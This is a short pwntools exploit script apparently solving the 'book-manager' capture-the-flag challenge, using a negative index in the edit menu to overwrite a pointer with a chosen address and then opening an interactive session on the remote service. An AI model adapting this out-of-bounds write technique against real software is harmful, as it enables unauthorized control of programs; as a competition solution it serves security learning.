from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
'''.format(**locals())

exe = './challenge/chall'
host = 'book-manager.challs.infobahnc.tf'
port = 1337
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

sla = lambda delim, data: io.sendlineafter(delim, data)
sa = lambda delim, data: io.sendafter(delim, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
ru = lambda delim: io.recvuntil(delim)
rl = lambda: io.recvline()
r = lambda num=4096: io.recv(num)

io = remote(host, port)

def create(title, author):
    sla(b'option: ', b'1')
    sla(b'title: ', title)
    sla(b'author: ', author)

def view():
    sla(b'option: ', b'2')
    ru(b'shelf:\n')
    return ru(b'\n===')[:-4].split(b'\n')

def edit(idx, title, author):
    sla(b'option: ', b'3')
    sla(b'edit: ', idx)
    sla(b'title: ', title)
    sla(b'author: ', author)

def delete(idx):
    sla(b'option: ', b'4')
    sla(b'delete: ', idx)


create(b'AA', b'BB')
edit(b'-2056', p64(0x401110), b'AAA')
sla(b'option: ', b'5')
print(io.recvline()[:-1])
sla(b'option: ', b'6')
io.interactive()
